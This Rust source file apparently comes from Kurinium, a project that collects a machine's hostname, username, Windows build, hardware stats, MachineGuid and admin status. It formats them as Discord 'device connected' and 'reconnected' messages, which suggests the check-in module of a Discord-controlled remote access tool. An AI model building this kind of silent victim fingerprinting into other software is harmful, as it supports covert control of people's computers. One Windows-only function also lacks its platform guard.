use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use sysinfo::{CpuExt, DiskExt, System, SystemExt};

const PROJECT_FOOTER: &str = "-# Kurinium: https://github.com/Mikasuru/Kurinium";

fn format_uptime(seconds: u64) -> String {
    let mut remaining = seconds;
    let days = remaining / 86_400;
    remaining %= 86_400;
    let hours = remaining / 3_600;
    remaining %= 3_600;
    let minutes = remaining / 60;
    let seconds = remaining % 60;

    let mut parts = Vec::new();
    if days > 0 {
        parts.push(format!("{}d", days));
    }
    if hours > 0 {
        parts.push(format!("{}h", hours));
    }
    if minutes > 0 {
        parts.push(format!("{}m", minutes));
    }
    if seconds > 0 || parts.is_empty() {
        parts.push(format!("{}s", seconds));
    }

    parts.join(" ")
}

fn summarize(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        return text.to_string();
    }

    let keep = max_len.saturating_sub(3);
    if keep == 0 {
        return "...".to_string();
    }

    let front = keep / 2;
    let back = keep - front;
    format!("{}...{}", &text[..front], &text[text.len() - back..])
}

fn windows_version_display() -> Option<String> {
    use winreg::enums::HKEY_LOCAL_MACHINE;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm
        .open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
        .ok()?;

    let product_name: String = key.get_value("ProductName").unwrap_or_default();
    if product_name.is_empty() {
        return None;
    }

    let display_version: String = key
        .get_value("DisplayVersion")
        .or_else(|_| key.get_value("ReleaseId"))
        .unwrap_or_default();
    let build_number: String = key.get_value("CurrentBuild").unwrap_or_default();
    let build_revision: u32 = key.get_value("UBR").unwrap_or(0);
    let is_win11 = build_number.parse::<u32>().unwrap_or(0) >= 22000;

    let fixed_product_name = if is_win11 && product_name.contains("Windows 10") {
        product_name.replace("Windows 10", "Windows 11")
    } else {
        product_name
    };

    let build = if !build_number.is_empty() {
        if build_revision > 0 {
            format!("{}.{}", build_number, build_revision)
        } else {
            build_number.clone()
        }
    } else {
        String::new()
    };

    if !display_version.is_empty() && !build.is_empty() {
        Some(format!(
            "{} {} (Build {})",
            fixed_product_name, display_version, build
        ))
    } else if !build.is_empty() {
        Some(format!("{} (Build {})", fixed_product_name, build))
    } else if !display_version.is_empty() {
        Some(format!("{} {}", fixed_product_name, display_version))
    } else {
        Some(fixed_product_name)
    }
}

#[cfg(not(target_os = "windows"))]
fn windows_version_display() -> Option<String> {
    None
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeviceInfo {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub os_version: String,
    pub architecture: String,
    pub device_id: String,
    pub hardware_id: String,
    pub admin_status: bool,
    pub current_directory: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    pub os: String,
    pub kernel: String,
    pub hostname: String,
    pub cpu_name: String,
    pub cpu_cores: usize,
    pub memory_total: u64,
    pub memory_used: u64,
    pub disk_total: u64,
    pub disk_used: u64,
    pub uptime: u64,
}

impl SystemInfo {
    pub fn get_detailed_info() -> Result<SystemInfo> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let os = match windows_version_display() {
            Some(details) => details,
            None => sys
                .long_os_version()
                .or_else(|| sys.os_version())
                .unwrap_or_else(|| std::env::consts::OS.to_string()),
        };

        let hostname = gethostname::gethostname().to_string_lossy().into_owned();

        let raw_total_memory = sys.total_memory();
        let raw_used_memory = sys.used_memory();
        let memory_multiplier = if raw_total_memory > (1u64 << 32) {
            1
        } else {
            1024
        };
        let total_memory = raw_total_memory.saturating_mul(memory_multiplier);
        let used_memory = raw_used_memory.saturating_mul(memory_multiplier);

        let cpu_cores = sys.physical_core_count().unwrap_or(sys.cpus().len());

        let mut total_disk: u64 = 0;
        let mut used_disk: u64 = 0;
        for disk in sys.disks() {
            total_disk = total_disk.saturating_add(disk.total_space());
            used_disk =
                used_disk.saturating_add(disk.total_space().saturating_sub(disk.available_space()));
        }

        Ok(SystemInfo {
            os,
            kernel: std::env::consts::ARCH.to_string(),
            hostname,
            cpu_name: sys.global_cpu_info().name().to_string(),
            cpu_cores,
            memory_total: total_memory,
            memory_used: used_memory,
            disk_total: total_disk,
            disk_used: used_disk,
            uptime: sys.uptime(),
        })
    }

    pub fn format_reconnection(&self, device: &DeviceInfo) -> String {
        let details = self.render_details(device);
        format!(
            "# Device **{}** reconnected\n{}\n{}",
            device.username, details, PROJECT_FOOTER
        )
    }

    pub fn format_for_discord(&self, device: &DeviceInfo) -> String {
        let details = self.render_details(device);
        format!(
            "# Device **{}** is now connected\n{}\n{}",
            device.username, details, PROJECT_FOOTER
        )
    }

    fn render_details(&self, device: &DeviceInfo) -> String {
        let uptime = format_uptime(self.uptime);
        let current_dir = summarize(&device.current_directory, 50);

        let mem_used_mb = self.memory_used / (1024 * 1024);
        let mem_total_mb = self.memory_total / (1024 * 1024);
        let mem_percent = if self.memory_total > 0 {
            (self.memory_used as f64 / self.memory_total as f64) * 100.0
        } else {
            0.0
        };

        let os_display = &self.os;
        let kernel = get_build_number().unwrap_or_else(|| self.kernel.clone());
        let elevated = if device.admin_status { "Yes" } else { "No" };

        format!(
            r#"**System Information:**
```
Hostname:      {}
Username:      {}
OS:            {}
Kernel:        {}
Architecture:  {}
Uptime:        {}
Memory:        {} MB / {} MB ({:.1}%)
CPU:           {}
CPU Cores:     {}

CWD:           {}
Elevated:      {}
```"#,
            device.hostname,
            device.username,
            os_display,
            kernel,
            device.architecture,
            uptime,
            mem_used_mb,
            mem_total_mb,
            mem_percent,
            self.cpu_name,
            self.cpu_cores,
            current_dir,
            elevated
        )
    }
}

fn get_build_number() -> Option<String> {
    use winreg::enums::HKEY_LOCAL_MACHINE;
    use winreg::RegKey;

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let key = hklm
        .open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
        .ok()?;
    let build: String = key.get_value("CurrentBuild").ok()?;
    Some(build)
}

impl DeviceInfo {
    pub fn new() -> Result<Self> {
        let hostname = gethostname::gethostname().to_string_lossy().into_owned();

        let username = std::env::var("USERNAME")
            .or_else(|_| std::env::var("USER"))
            .unwrap_or_else(|_| "unknown".to_string());

        let os_version =
            windows_version_display().unwrap_or_else(|| std::env::consts::OS.to_string());
        let architecture = std::env::consts::ARCH.to_string();

        let device_id = Self::generate_device_id()?;

        Ok(DeviceInfo {
            hostname,
            username,
            os: os_version.clone(),
            os_version,
            architecture,
            device_id: device_id.clone(),
            hardware_id: device_id,
            admin_status: Self::is_admin(),
            current_directory: std::env::current_dir()
                .unwrap_or_else(|_| Path::new("").to_path_buf())
                .to_string_lossy()
                .to_string(),
        })
    }

    fn generate_device_id() -> Result<String> {
        use winreg::enums::HKEY_LOCAL_MACHINE;
        use winreg::RegKey;

        if let Ok(key) =
            RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Cryptography")
        {
            let value: String = key
                .get_value("MachineGuid")
                .map_err(|e| anyhow!("Failed to read MachineGuid: {e}"))?;
            let trimmed = value.trim();
            if !trimmed.is_empty() {
                return Ok(trimmed.to_string());
            }
        }

        Ok("unknown-device".to_string())
    }

    // Use shared admin check from utils
    fn is_admin() -> bool {
        crate::utils::admin::is_admin()
    }
}
